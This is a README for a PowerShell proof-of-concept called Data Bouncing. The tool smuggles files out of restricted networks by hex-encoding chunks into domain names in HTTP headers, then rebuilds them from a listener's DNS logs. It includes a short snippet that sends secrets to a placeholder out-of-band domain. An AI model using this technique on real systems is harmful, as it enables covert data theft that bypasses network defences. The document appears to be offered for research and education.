# Data Bouncing - PowerShell Version

## Overview
Data Bouncing is a technique for transmitting data between two endpoints using DNS lookups and HTTP header manipulation. This PowerShell version encapsulates core functionalities of data bouncing, including reconnaissance, data exfiltration, and file reassembly, based on a proof of concept (PoC) by John and Dave. More details can be found at [The Contractor](https://thecontractor.io/DataBouncing).

## Components
The project consists of two main scripts:
- `exfil.ps1`: Manages data exfiltration.
- `recreate.ps1`: Handles reassembly of the exfiltrated data.

### `exfil.ps1`
This script encodes a file into hexadecimal chunks and sends each chunk as part of a domain name in an HTTP request header. It's used for exfiltrating data from restrictive networks.

### `recreate.ps1`
Processes data received from `exfil.ps1`, finding patterns in logs, assembling data chunks, and converting them back to their original form.

## Usage
### Prerequisites
- A controlled DNS server.
- For hobbyists, [InteractSh](https://github.com/projectdiscovery/interactsh) is recommended.

### Setting Up
1. **Listener Setup**:
   Use [InteractSh Web Client](https://app.interactsh.com/#/) or the [Build Script](https://github.com/Unit-259/DataBouncing/blob/main/Resources/interactshBuild.sh) with Ubuntu 22.04.

   Start the InteractSh Client on your listener machine:

2. **Target Machine Preparation**:
Convert a file to hex for transfer using [Convert-FileToHexChunks.ps1](https://github.com/Unit-259/DataBouncing/blob/main/Client/Convert-FileToHexChunks.ps1).

### Running the Scripts
1. **Data Exfiltration with `exfil.ps1`**:

2. **Data Reconstruction with `recreate.ps1`**:

## Additional Functions
- `Demo-Secrets` for testing exfiltration:

  foreach ($segment in $segments.PSObject.Properties) {
      $secret = $segment.Value
      $url = "$xregex.$secret.$urlSuffix"
      Send-CustomRequest $url
  }


## Notes
- Remember to replace placeholders like 'your-regex', 'your-domain.oast.online', etc., with actual values relevant to your setup.
- The scripts are part of a PoC and should be used responsibly.

## Disclaimer
This project is for educational purposes only. Users are responsible for ensuring they comply with all applicable laws and regulations.
